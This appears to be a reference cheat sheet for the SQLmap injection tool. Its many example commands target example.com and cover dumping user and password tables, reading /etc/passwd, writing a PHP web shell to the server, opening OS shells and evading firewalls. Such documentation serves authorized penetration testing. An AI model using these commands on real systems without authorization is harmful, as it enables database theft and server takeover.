SQLmap

Automatic SQL injection and database takeover tool

Overview

SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. It comes with a powerful detection engine, many specialized features, and a broad range of options for the ultimate penetration tester.

Key Information

  • Developer: Bernardo Damele A. G. and Miroslav Å tampar
  • License: GPL-2.0
  • Platform: Cross-platform (Python-based)
  • Language: Python
  • First Release: 2006

Key Features

  • Database Support: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, and more
  • Detection Techniques: Boolean-based blind, time-based blind, error-based, UNION query-based
  • Database Enumeration: Users, passwords, privileges, roles, databases, tables, columns
  • Data Dumping: Entire database contents or specific entries
  • File System Access: Read/write files on the underlying file system
  • Operating System Access: Execute commands on the underlying operating system
  • Advanced Features: WAF bypass, proxy support, tamper scripts

Basic Usage

Simple SQL Injection Test

# Basic URL testing
sqlmap -u "http://example.com/page.php?id=1"

# Test with cookie authentication
sqlmap -u "http://example.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Test with custom headers
sqlmap -u "http://example.com/page.php?id=1" --header="X-Forwarded-For: 127.0.0.1"

POST Request Testing

# Test POST data
sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"

# Test with request file (captured from Burp Suite)
sqlmap -r request.txt

# Test specific parameter
sqlmap -u "http://example.com/page.php" --data="id=1&name=test" -p id

Database Enumeration

# Get current database user
sqlmap -u "http://example.com/page.php?id=1" --current-user

# Get current database name
sqlmap -u "http://example.com/page.php?id=1" --current-db

# List all databases
sqlmap -u "http://example.com/page.php?id=1" --dbs

# List tables in specific database
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables

# List columns in specific table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T table_name --columns

Advanced Techniques

Data Extraction

# Dump entire database
sqlmap -u "http://example.com/page.php?id=1" -D database_name --dump-all

# Dump specific table
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users --dump

# Dump specific columns
sqlmap -u "http://example.com/page.php?id=1" -D database_name -T users -C username,password --dump

# Search for specific data
sqlmap -u "http://example.com/page.php?id=1" --search -C password

Blind SQL Injection

# Force blind injection techniques
sqlmap -u "http://example.com/page.php?id=1" --technique=B

# Time-based blind injection
sqlmap -u "http://example.com/page.php?id=1" --technique=T

# Boolean-based blind injection
sqlmap -u "http://example.com/page.php?id=1" --technique=B --no-cast

WAF Bypass

# Use tamper scripts to bypass WAF
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,equaltolike

# Random user agent
sqlmap -u "http://example.com/page.php?id=1" --random-agent

# Custom delay between requests
sqlmap -u "http://example.com/page.php?id=1" --delay=2

File System Operations

# Read file from server
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"

# Write file to server
sqlmap -u "http://example.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Check file system privileges
sqlmap -u "http://example.com/page.php?id=1" --privileges

Operating System Commands

# Execute operating system commands
sqlmap -u "http://example.com/page.php?id=1" --os-cmd="whoami"

# Interactive OS shell
sqlmap -u "http://example.com/page.php?id=1" --os-shell

# SQL shell
sqlmap -u "http://example.com/page.php?id=1" --sql-shell

Risk and Level Settings

# Risk levels (1-3)
# 1: Default, safe tests
# 2: Adds heavy time-based SQL injection tests
# 3: Adds OR-based SQL injection tests
sqlmap -u "http://example.com/page.php?id=1" --risk=2

# Level settings (1-5)
# Higher levels test more parameters and headers
sqlmap -u "http://example.com/page.php?id=1" --level=3

# Combine risk and level
sqlmap -u "http://example.com/page.php?id=1" --risk=3 --level=5

Popular Tamper Scripts

  • space2comment: Replaces spaces with comments (/* */)
  • equaltolike: Replaces equals sign with LIKE operator
  • base64encode: Base64-encodes all characters in a given payload
  • charencode: URL-encodes all characters in a given payload
  • randomcase: Replaces each character with random case value
  • space2plus: Replaces space character with plus sign
  • unionalltounion: Replaces UNION ALL SELECT with UNION SELECT

Evasion Techniques

# Randomize user agent
sqlmap -u "http://example.com/page.php?id=1" --random-agent

# Use proxy
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Custom HTTP method
sqlmap -u "http://example.com/page.php?id=1" --method=PUT

# Thread control for stealth
sqlmap -u "http://example.com/page.php?id=1" --threads=1 --delay=5

# Skip URL encoding
sqlmap -u "http://example.com/page.php?id=1" --skip-urlencode

Output and Logging

# Verbose output
sqlmap -u "http://example.com/page.php?id=1" -v 3

# Save session
sqlmap -u "http://example.com/page.php?id=1" --save

# Load session
sqlmap -u "http://example.com/page.php?id=1" --load-session

# Custom output directory
sqlmap -u "http://example.com/page.php?id=1" --output-dir=/tmp/sqlmap

Integration with Burp Suite

# Steps to integrate with Burp Suite:
1. Configure Burp proxy (127.0.0.1:8080)
2. Capture request in Burp
3. Copy to file or save request
4. Use sqlmap with request file:

sqlmap -r burp_request.txt --batch --risk=3 --level=5

MySQL

# MySQL-specific enumeration

# Read MySQL configuration
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/mysql/my.cnf"

MSSQL

# MSSQL xp_cmdshell
sqlmap -u "http://example.com/page.php?id=1" --os-shell --dbms=mssql

# Registry operations
sqlmap -u "http://example.com/page.php?id=1" --reg-read --dbms=mssql

Best Practices

  1. Always get proper authorization before testing
  2. Start with low risk/level settings to avoid detection
  3. Use appropriate delays between requests
  4. Save sessions for complex engagements
  5. Validate findings manually when possible
  6. Document methodology and findings thoroughly
  7. Use tamper scripts to bypass security controls
  8. Clean up artifacts after testing

Common Challenges

  • WAF Detection: Use tamper scripts and delays
  • Rate Limiting: Implement delays and proxy rotation
  • Session Management: Handle authentication properly
  • Complex Parameters: Use request files from proxy tools
  • False Positives: Manually validate all findings

Integration with Other Tools

  • Burp Suite: Capture and replay requests
  • OWASP ZAP: Alternative proxy for request capture
  • Nikto: Combine with web vulnerability scanning
  • Nmap: Port scanning before web application testing
  • Metasploit: Exploit discovered SQL injection vulnerabilities
